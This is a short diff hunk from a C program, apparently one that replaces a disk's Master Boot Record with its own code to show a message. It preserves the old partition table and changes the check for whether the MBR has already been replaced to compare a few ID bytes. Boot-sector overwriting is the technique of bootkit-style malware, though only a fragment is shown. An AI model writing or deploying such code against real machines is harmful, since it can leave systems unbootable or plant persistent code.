@@ -88,8 +88,8 @@ void write_message(char message[], DWORD length){
 		// fixup the new MBR
 		memcpy(newMbr + 0x01b0, oldMbr + 0x01b0, 0x40);
 
-		// ensure the old MBR and new MBR are not the same
-		for (i = 0;i < 512;i++)
+		// ensure the old MBR is not ours, check ID bytes -- that could really screw things up
+		for (i = 2;i < 10;i++)
 			if (newMbr[i] != oldMbr[i])
 				break;
 
